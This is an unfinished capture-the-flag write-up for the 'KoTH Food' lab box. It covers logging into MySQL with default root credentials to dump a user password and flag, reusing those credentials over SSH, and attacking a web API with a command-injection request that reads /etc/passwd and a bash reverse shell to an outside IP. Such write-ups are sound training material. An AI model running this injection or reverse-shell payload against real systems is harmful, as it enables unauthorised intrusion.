# KoTH Food CTF
![alt text](desc.png)


## GET ALL 8 FLAGS
    
## 1/8
    **MySQL**
    Using default creds got this user/pass and flag
    mysql -u root -h <ip> -P 3306 -proot
    MySQL [users]> select * from User;
    +----------+---------------------------------------+
    | username | password                              |
    +----------+---------------------------------------+
    | ramen    | noodlesRTheBest                       |
    | flag     | thm{2f30841ff8d9646845295135adda8332} |
    +----------+---------------------------------------+

## 2/8
    **SSH**
    use the creds listed above to connect
    *moving to /home/bread we got a second flag* said an old wu

## 3/8
    **Web App**
    reminded me PHP - Injection de commande from Root-Me
    
    gobuster dir -u http://<ip>:15065/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
    curl -X POST http://<ip>:15065/api/cmd -d "ping -c 4 127.0.0.1; cat /etc/passwd"
    Get the RCE
    curl -X POST http://<ip>:15065/api/cmd \ -d "bash -c 'bash -i >& /dev/tcp/10.11.132.35/4444 0>&1'"
    Need to privesc to ged the flag

## 4/8
    other flag ?
    
    15065/tcp open  http    syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
    |_http-title: Host monitoring
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS




    
